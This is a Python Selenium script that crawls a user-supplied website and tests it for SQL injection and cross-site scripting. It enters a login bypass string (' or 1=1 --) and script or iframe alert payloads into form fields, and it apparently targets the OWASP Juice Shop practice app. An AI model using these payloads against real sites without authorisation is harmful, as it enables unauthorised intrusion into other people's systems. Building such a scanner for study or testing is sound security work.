from time import sleep
from random import uniform
from soup_methods import find_links, find_buttons, find_inputs
from bs4 import BeautifulSoup
from init import initialize
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

def available_links(driver,site):
    domain = site.split('.')[0]
    driver.get(site)
    while len(queue) != 0 : 
        link = queue[0] 
        driver.get(f'{site}{link}')
        sleep(uniform(1.3,1.7))
        page = driver.page_source
        if '404' not in page :
            soup = BeautifulSoup(page,'html.parser')
            for ref in find_buttons(soup,queue,available):
                if ref not in queue:
                    queue.append(ref)
            for ref in find_links(soup,domain,queue,available):
                if ref not in queue:
                    queue.append(ref)
            available.add(queue.pop(0))
        else:
            queue.pop(0)

def check_form_val(driver,site):
    vulnerable_links=[]
    for link in available:
        driver.get(f'{site}{link}')
        sleep(uniform(1.5,1.8))
        page = driver.page_source
        soup = BeautifulSoup(page,'html.parser')
        if find_inputs(soup):
            vulnerable_links.append(link)
    return vulnerable_links


def loginsqlinjection(site,link,driver): #check for sql injection
    driver.get(f'{site}{link}')
    sleep(2)
   # driver.find_element_by_xpath('/html/body/div[3]/div[2]/div/mat-dialog-container/app-welcome-banner/div/button[2]/span/span').click() #find login button
    driver.find_element_by_xpath('//*[@id="email"]').send_keys(" ' or 1=1 -- ")
    password=driver.find_element_by_xpath('//*[@id="password"]') 
    text='sqlinjection'
    for characters in text:
        password.send_keys(characters)
        sleep(0.3) #set username and password 
    driver.find_element_by_xpath('//*[@id="loginButton"]').click() 
    sleep(5)
    if driver.current_url=='https://juice-shop.herokuapp.com/#/search': #check if login failed 
          print("your page is vulnerable to sql injection")
    else:
        print("login failed")

def xssattack(driver,links):
    attacks = ['<script>alert("1")</script>','<iframe src="javascript:alert(`1`)">']
    print('\nChecking for successful XSS attacks')
    flag = False
    for link in links:
        driver.get(f'{site}{link}')
        soup = BeautifulSoup(driver.page_source,'html.parser')
        inp = soup.find('input')
        input_found = False
        try:
            if isinstance(inp,list):
                attribute = inp['class'][0]
            else:
                attribute = inp['class']
            input_form = driver.find_element_by_class_name(attribute)
            input_form.click()
            input_found = True
        except:
            pass
        
        try:
            if isinstance(inp,list):
                attribute = inp['id'][0]
            else:
                attribute = inp['id']
            input_form = driver.find_element_by_id(attribute)
            input_form.click()
            input_found = True
        except:
            pass
        
        try:
            input_form = driver.find_elements_by_xpath("//*[contains(text(), 'search')]")
            if isinstance(input_form,list):
                for i in input_form:
                    try:
                        i.click()
                        input_found = True
                        input_id = soup.find('input')['id']
                        input_form = driver.find_element_by_id(input_id)
                        break
                    except:
                        pass
            else:
                input_form.click()
                input_found = True
        except:
            pass
        if input_found == True:
            for attack in attacks:
                if isinstance(input_form,list):
                    for i in input_form:
                        try:
                            input_form.send_keys(attack)
                            input_form.send_keys(Keys.RETURN)
                            break
                        except:
                            pass
                else:
                    input_form.send_keys(attack)
                    input_form.send_keys(Keys.RETURN)
                try:
                    alert = WebDriverWait(driver,2).until(EC.alert_is_present())
                    alert.accept()
                    flag = True
                except:
                    pass
                if flag == True:
                    return True
        else:
            continue 
    return None

if __name__ == '__main__':
    queue = list()
    available = set()
    driver = initialize()

    queue.append('/')
    available.add('/')

    site = input('Give site full url: ')
    print('\nFinding available urls of the given site')

    available_links(driver,site)

    print('Available Urls:')
    for link in available:
        print(f'---{link}')
    print('\n')
    vulnerable_links = check_form_val(driver,site)
    for vul_link in vulnerable_links:
        if 'login' in vul_link or 'signup' in vul_link:
            print(f'{vul_link} is probably vulnerable to Sql Injection')
        else:
            print(f'{vul_link} is probably vurnerable to XSS attack')

   # if '/login/' in  vulnerable_links: #check if link has login 
   #     loginsqlinjection(site,'/login/',driver)
    
    response = xssattack(driver,available)

    if response is None:
       print('\nXss attacks failed')
    else:
       print('\nThere are available xss attacks')